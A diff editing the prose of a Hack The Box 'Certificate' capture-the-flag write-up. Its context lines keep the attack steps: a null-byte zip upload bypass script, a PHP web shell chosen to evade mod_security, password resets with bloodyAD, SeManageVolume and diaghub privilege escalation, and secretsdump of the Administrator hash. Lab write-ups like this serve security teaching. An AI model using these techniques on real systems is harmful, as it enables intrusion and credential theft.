@@ -44,7 +44,7 @@ remediation:
 
 ::: stage n=1 label="UPLOAD" title="A course portal that trusts the MIME header."
 
-Nmap paints a {red:certificate.htb} AD footprint: DNS, HTTP (Apache 2.4.58 on port 80), Kerberos on 88, LDAP on 389, SMB on 445. DC01 is the domain controller.
+Nmap shows the AD services on {red:certificate.htb}: DNS, HTTP (Apache 2.4.58 on port 80), Kerberos on 88, LDAP on 389, SMB on 445. DC01 is the domain controller.
 
 ::: terminal title="shell · operator@kali" lang="bash"
 $ nmap -A -T5 10.129.237.217 --min-rate 2000
@@ -71,7 +71,7 @@ The server checks {warn:MIME type}, not the extension alone.
 
 ::: stage n=2 label="FOOTHOLD" title="Null byte + .zip rename into PHP execution."
 
-The trick: wrap the payload in an allowed `.zip`, rename the inner file to `dump.php\x00.pdf`. PHP on Windows honors the null byte before the extension, Apache still routes `.php` to the handler.
+Wrap the payload in an allowed `.zip` and name the inner file `dump.php\x00.pdf`. PHP on Windows honors the null byte before the extension, and Apache routes `.php` to the handler.
 
 ::: terminal title="zip-forge · operator@kali" lang="python"
 import os, zipfile
@@ -91,7 +91,7 @@ with zipfile.ZipFile(zip_path, 'r') as zip_read:
             zip_write.writestr(item, data)
 :::
 
-`system()` is flagged by XAMPP's mod_security defaults. Switching to `shell_exec` slips past:
+XAMPP's default mod_security rules flag `system()`. Switching to `shell_exec` gets past the filter:
 
 ```php
 <?php echo(shell_exec($_GET['cmd'])); ?>
@@ -151,7 +151,7 @@ $ bloodyAD -d certificate.htb -u sara.b -p '[REDACTED]' \
 [+] Password changed successfully!
 :::
 
-`evil-winrm` back in as Ryan.K. `whoami /priv` shows the prize:
+Connect again with `evil-winrm` as Ryan.K and check `whoami /priv`:
 
 ::: terminal title="shell · Ryan.K@certificate.htb" lang="powershell"
 PS C:\Users\Ryan.K> whoami /priv
@@ -162,13 +162,13 @@ SeManageVolumePrivilege        Perform volume maintenance tasks    Enabled
 SeIncreaseWorkingSetPrivilege  Increase a process working set      Enabled
 :::
 
-{warn:SeManageVolumePrivilege} is the ticket.
+The account has {warn:SeManageVolumePrivilege}.
 
 :::
 
 ::: stage n=5 label="SYSTEM" title="SeManageVolumeAbuse and diaghub LOLBAS, to Administrator NT hash."
 
-The privilege lets us change ACLs on any file. `xct/SeManageVolumeAbuse.exe C:\Windows\System32` opens the door, but `root.txt` itself is locked down by the box creator (some custom magic I couldn't unravel).
+The privilege lets us change ACLs on files. `xct/SeManageVolumeAbuse.exe C:\Windows\System32` changes access to System32, but `root.txt` itself is locked down by the box creator. I could not work out how.
 
 Plan B: LOLBAS `diaghub.exe` drops a payload into `System32\spool\drivers\color\` and executes as SYSTEM.
 
@@ -192,7 +192,7 @@ moriz          Nya.S      Ryan.K
 
 ::: img src="../assets/img/writeups/htb-certificate/05-net-user.png" caption="moriz joins the Administrators group after diaghub fires as SYSTEM"
 
-The new {ok:moriz} account is now in Administrators. `secretsdump.py` over the domain pops the Administrator NT hash:
+The new {ok:moriz} account is in Administrators. Run `secretsdump.py` against the domain to get the Administrator NT hash:
 
 ::: terminal title="shell · moriz · impacket" lang="bash"
 $ secretsdump.py 'certificate.htb/moriz:[REDACTED]@certificate.htb'
